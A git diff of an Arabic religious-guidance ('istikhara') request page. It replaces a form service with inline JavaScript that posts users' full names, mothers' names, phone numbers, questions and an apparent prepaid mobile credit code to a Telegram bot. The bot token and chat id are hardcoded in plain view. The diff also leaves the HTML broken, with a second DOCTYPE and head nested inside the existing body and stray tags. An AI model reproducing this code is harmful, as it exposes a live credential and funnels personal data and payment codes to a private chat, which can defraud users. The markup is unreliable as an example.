@@ -176,7 +176,48 @@
 
     <p>اللهم إني أستخيرك بعلمك، فصل على محمد وآله، واقض لي بالخيرة، وألهمنا معرفة الاختيار، واجعل ذلك ذريعة إلى الرضا بما قضيت لنا، والتسليم لما حكمت، فأزح عنا ريب الارتياب، وأيدنا بيقين المخلصين</p>
 
-    <form action="https://formspree.io/f/manybgnv" method="POST">
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج الخيرة</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            text-align: right;
+            margin: 20px;
+        }
+        form {
+            max-width: 600px;
+            margin: auto;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input, textarea, button {
+            width: 100%;
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <form id="kheeraForm">
         <label for="fullName">الاسم الثلاثي</label>
         <input type="text" id="fullName" name="fullName" required>
 
@@ -200,11 +241,60 @@
 
         <button type="submit">إرسال الخيرة</button>
     </form>
-</div>
 
+    <script>
+        const form = document.getElementById('kheeraForm');
+        const botToken = "8053315482:AAGEZdnd0lYUOLYkAe8kJMwSa13oxfW2A20";
+        const chatId = "7339992828";
 
-    </style>
-</head>
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const fullName = document.getElementById('fullName').value;
+            const motherName = document.getElementById('motherName').value;
+            const phone = document.getElementById('phone').value;
+            const question1 = document.getElementById('question1').value;
+            const question2 = document.getElementById('question2').value;
+            const question3 = document.getElementById('question3').value;
+            const asiaCredit = document.getElementById('asiaCredit').value;
+
+            const message = `
+                ✨ *طلب الخيرة الجديد* ✨
+                *الاسم الثلاثي:* ${fullName}
+                *اسم الأم الثلاثي:* ${motherName}
+                *رقم الهاتف:* ${phone}
+                *الاستفسار الأول:* ${question1}
+                *الاستفسار الثاني:* ${question2}
+                *الاستفسار الثالث:* ${question3}
+                *رصيد آسيا:* ${asiaCredit}
+            `;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown',
+                    }),
+                });
+
+                if (response.ok) {
+                    alert('تم إرسال الطلب بنجاح!');
+                    form.reset();
+                } else {
+                    alert('حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.');
+                }
+            } catch (error) {
+                alert('حدث خطأ أثناء الإرسال. يرجى التحقق من الاتصال بالإنترنت.');
+            }
+        });
+    </script>
 <body>
 <style>
         /* استيراد خط ديني */
